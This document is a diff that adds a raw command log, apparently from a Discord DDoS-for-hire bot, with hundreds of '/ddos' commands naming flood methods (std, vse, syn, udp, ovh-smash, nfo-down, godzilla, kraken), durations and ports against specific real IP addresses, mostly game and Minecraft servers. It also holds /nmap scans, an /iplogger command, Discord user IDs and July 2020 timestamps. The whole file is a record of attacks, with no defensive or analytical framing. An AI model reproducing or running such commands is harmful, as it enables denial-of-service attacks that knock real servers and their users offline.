@@ -1,0 +1,256 @@
+/plan
+/checkip 20.50.12.90
+/checkip 74.201.107.37
+/ddos std 74.201.107.37 30 51286
+/checkip 128.116.53.146
+/ddos std 128.116.53.146 120 54277
+/checkip 212.199.38.38
+/checkip https://ksp.co.il/
+/checkip 104.22.22.122
+/checkip 104.31.92.176
+/ping 104.31.92.176
+/ddos std 104.31.92.176 1
+/checkip212.80.204.170
+/checkip 212.80.204.170
+/ddos stdhex 212.80.204.170 60
+/ddos htpp 212.80.204.170 120
+/ddos http 212.80.204.170 120
+/methods
+/ddos ovh-smash 212.80.204.170 60
+/ddos udp 212.80.204.170 60 conns=5000
+/ddos ovh-smash 212.80.204.170 60
+/ddos nfo-down 212.80.204.170 60
+/ddos nfo-down 212.80.204.170 60
+/ddos nfo-down 104.31.92.176 60
+/ddos nfo-down 185.185.134.236 60
+/ddos http 185.185.134.236 60 27015
+/ddos ovh-smash 185.185.134.236 20 27015
+/ddos std 185.185.134.236 120 27015
+/ddos std 185.185.134.236 20 27015
+/ddos std 185.185.134.236 20 27015
+/info
+/ddos std 185.185.134.236 20 27015
+/ddos std 185.185.134.236 20 27015
+/ping 172.67.172.26
+/checkip 172.67.172.26
+/ddos stdhex 172.67.172.26 60
+/ddos std 185.185.134.23 20
+/ddis std 185.185.134.23 240
+/ddos udp 35.227.62.178 1200
+/getplan <@675837090126102560>
+/getplan <@679762231541366797>
+/plan
+/accounts
+/ddos std 185.185.134.236 30 27015
+/checkip 185.185.134.236
+/methods
+/ddos tcp 185.185.134.236 30 27015
+/ddos udp 185.185.134.236 30 80
+/ddos std 185.185.134.236 30 27015
+/ddos stdhex 185.185.134.236 30 80
+/ddos udp 35.227.62.178 1200
+/ping 35.227.62.178
+/ddos udp 35.227.62.178 20
+/plan
+/getplan
+/ddos udp 185.185.134.236 10 27015
+/ddos tcp 185.185.134.236 10 27015
+/ddos tcp 185.185.134.236 30 27015
+/ddos std 185.185.134.236 10 27015
+/ddos std 185.185.134.236 30 27015
+/ddos std 185.185.134.236 60 27015
+/ddos std 185.185.134.243 60 10001
+/ddos std 185.185.134.236 60 27015
+/info
+/ddos std 185.185.134.236 120 27015
+/methods
+/ddos stdhex.185.134.236 120 27015
+/ddos stdhex 185.134.236 120 27015
+/ddos vse 185.134.236 120 27015
+/ddos ack 185.134.236 120 27015
+/ddos syn 185.134.236 120 27015
+/ddos udpplain 185.134.236 120 27015
+/ddos std  185.134.236 120 80
+/ddos std 185.185.134.236 120 27015
+/ddos syn 185.185.134.236 120 27015
+/ddos std 185.185.134.23 120 27055
+/ddos tcp 185.185.134.236 120 27015
+/help
+/info
+/lag
+/lag std 185.185.134.236 1 120 1 27015
+/ddos std 185.185.134.236 120 27015
+/ddos vse 185.185.134.236 120 27015
+/ddos vse 185.185.134.243 1200 10003
+/ddos std 185.185.134.243 1200 10003
+/methods
+/ddos vse 185.185.134.236 1200 27015
+/ddos std 185.185.134.236 1200 27015
+/nmap 185.185.134.236:27015
+/nmapresult
+/ddos std 185.185.134.236 1200 27015
+/ping wvvw-roblox.com
+/checkip wvvw-roblox.com
+/checkip 104.27.136.79
+/ddos stdhex 104.27.136.79 1200 443
+/methods
+/ddos squid 104.27.136.79 1200 443
+/ddos squid 104.27.136.79 1200 443
+/ddos std 185.185.134.236 60 27015
+/ddos vse 185.185.134.236 60 27015
+/ddos std 185.116.156.172 60 25565
+/ddos udp 84.229.87.41 30 80
+/methods
+/ddos udpplain 84.229.87.41 300 80
+/ping 84.229.87.41
+/ping 87.71.131.0
+/ddos std 185.185.134.236 60 27015
+/ddos std 185.185.134.236 60 27015
+/ddos vse 185.185.134.236 60 27015
+/ddos vse 185.185.134.236 1200 27015
+/ddos vse 185.185.134.242 60 10001
+/ddos vse 91.202.171.189 30 27416
+/ddos std 91.202.171.189 30 27416
+/info
+/ddos vse 185.185.134.236 60 27015
+/ddos vse 185.185.134.236 60 27015
+/ddos std 185.185.134.236 60 27015
+/ddos std 185.185.134.236 120 27015
+/ddos std 185.185.134.236 120 27015
+/ddos vse 185.185.134.236 120 27015
+/ddos vse 185.185.134.236 120 27015
+/ddos vse 185.185.134.243 120 10004
+/ddos std 185.185.134.243 120 10004
+/ddos vse 185.185.134.243 120 10004
+/ddos vse 185.185.134.243 1200 10004
+/ddos std 185.185.134.243 1200 10004
+/ddos std 185.185.134.243 1200 10004
+/ddos std 185.185.134.236 1200 27015
+/ddos vse 185.185.134.236 120 27015
+/methods
+/ddos std 51.89.170.26 120 25565
+/ddos std 51.89.170.26 120 25565
+/ddos std 145.239.204.22 120 25565
+/ddos std 185.185.134.236 120 27015
+/ddos godzilla std 185.185.134.236 120 27015
+/ddos godzilla cvse 185.185.134.236 120 27015
+/methods
+/ddos godzilla cvse 185.185.134.236 120 27015 10 50000
+/ddos godzilla cvse 185.185.134.243 120 27015
+/ddos godzilla cvse 185.185.134.23 1200 27050
+/ddos godzilla cvse 185.185.134.23 120 27050
+/ddos godzilla cvse 185.185.134.23 120 27050
+/ddos godzilla cvse 185.185.134.243 1200 10002
+/ddos godzilla ctcp 185.185.134.243 1200 10002
+/ddos godzilla ctcp 185.185.134.243 1200 10002
+/ddos godzilla cvse 185.185.134.243 1200 10002
+/ddos godzilla std 185.185.134.236 120 27015
+/ddos godzilla cudp 185.185.134.236 1200 27015
+/ddos godzilla cudp 185.185.134.236 120 27015
+/ddos godzilla std 185.185.134.236 120 27015
+/methods
+/ddos godzilla ctcp 185.185.134.236 120 27015
+/plan
+/ddos godzilla ctcp 185.185.134.236 120 27015
+/ddos godzilla cvse 185.185.134.236 120 27015
+/ddos godzilla cvse 185.185.134.236 1200 10870
+/ddos godzilla ctcp 185.185.134.236 1200 10870
+/ddos godzilla std 185.185.134.236 120 10870
+/ddos kraken std 185.185.134.236 120 27015
+/ddos kraken std 185.185.134.236 120 27015
+/ddos godzilla cvse 185.185.134.236 120 10870
+/ddos kraken vse 185.185.134.236 1200 10870
+/ddos godzilla std  185.185.134.236 120 10870
+/methods
+/ddos godzilla cvse 185.185.134.236 120 10870 50 1024
+/ddos kraken std 185.185.134.236 120 27015
+/ddos godzilla cudp 185.185.134.236 120 27015 12000 1024
+/ddos godzilla cvse 185.185.134.236 120 27015 100000 1024
+/checkservers
+/info
+/help
+/checkservers
+/ddos godzilla std 185.185.134.236 120 27015
+/ddos godzilla std 185.185.134.236 120 27015
+/ddos godzilla cvse 185.185.134.236 120 27015 100000 1024
+/checkservers
+/checkservers
+/checkservers
+/checkservers
+/checkservers
+/checkservers
+/ddos godzilla cvse 185.185.134.236 120 27015
+/ddos godzilla std 185.185.134.236 120 27015
+/ddos godzilla vse 185.185.134.236 120 27015
+/ddos godzilla vse 185.185.134.236 120 27015
+/help
+/methods
+/ddos godzilla vse 185.185.134.236 120 27015
+/ddos godzilla vse 185.185.134.243 120 10001
+/ddos godzilla vse 185.185.134.236 120 27015
+/ddos godzilla vse 185.185.134.243 120 10001
+/plan
+/ddos godzilla std 185.185.134.243 120 10001
+/ddos godzilla std 185.185.134.243 120 10001
+/iplogger
+/ddos godzilla std 185.185.134.243 120 10001
+/ddos kraken std 185.185.134.236 120 27015
+/methods
+/ddos godzilla std 185.185.134.236 120 27015
+/ddos godzilla vse 185.185.134.236 120 27015
+/ddos godzilla cvse 185.185.134.236 120 27015
+/ddos kraken vse 185.185.134.236 120 27015
+/ddos godzilla std 185.185.134.243 120 10001
+/plan
+/ddos godzilla std 46.174.54.178 120 1337
+/ddos godzilla vse 46.174.54.178 120 1337
+/ddos kraken vse 46.174.54.178 120 1337
+/ddos kraken std 46.174.54.178 120 1337
+/ddos godzilla cvse 46.174.54.178 120 1337
+/checkip 46.174.54.178
+/checkip 104.22.22.122
+/ping 104.22.22.122
+/methods
+/ddos kraken ovh-smash 104.22.22.122 120
+/ddos kraken nfo-down 104.22.22.122 120
+/ddos kraken vse 104.22.22.122 120
+/ddos kraken squid 104.22.22.122 120
+/ddos kraken ack 104.22.22.122 120
+/ddos godzilla ack 104.22.22.122 120
+/ddos
+/methods
+/ddos kraken udp 185.185.134.236 20 27015
+/ddos kraken udpplain 185.185.134.236 20 27015
+/ddos kraken tcp 185.185.134.236 20 27015
+/ddos kraken syn 185.185.134.236 20 27015
+/ddos kraken ack 185.185.134.236 20 27015
+/ddos kraken vse 185.185.134.236 20 27015
+/ddos kraken std 185.185.134.236 20 27015
+/ddos kraken squid 185.185.134.236 20 27015
+/ddos kraken ovh-smash 185.185.134.236 20 27015
+/ddos kraken nfo-down 185.185.134.236 20 27015
+/methods
+/ddos godzilla udp 185.185.134.236 20 27015
+/ddos godzilla tcp 185.185.134.236 20 27015
+/ddos godzilla syn 185.185.134.236 20 27015
+/ddos godzilla ack 185.185.134.236 20 27015
+/ddos godzilla std 185.185.134.236 20 27015
+/ddos godzilla xmas 185.185.134.236 20 27015
+/ddos godzilla vse 185.185.134.236 20 27015
+/ddos godzilla cnc 185.185.134.236 20 27015
+/ddos godzilla cudp 185.185.134.236 20 27015
+/ddos godzilla ctcp 185.185.134.236 20 27015
+/ping
+/ping 185.185.134.236
+/accounts
+/vpn
+/vpn
+/vpn
+/accounts
+[Wed Jul 29 2020 07:13:00 GMT-1100 (Samoa Standard Time)] /checkip unique.mcserv.pro
+[Thu Jul 30 2020 02:33:51 GMT-1100 (Samoa Standard Time)] /vpn
+[Thu Jul 30 2020 02:34:45 GMT-1100 (Samoa Standard Time)] /vpn
+[Thu Jul 30 2020 02:35:57 GMT-1100 (Samoa Standard Time)] /vpn
+[Thu Jul 30 2020 02:36:00 GMT-1100 (Samoa Standard Time)] /vpn
+[Thu Jul 30 2020 02:36:01 GMT-1100 (Samoa Standard Time)] /vpn
+[Thu Jul 30 2020 04:45:34 GMT-1100 (Samoa Standard Time)] /accounts
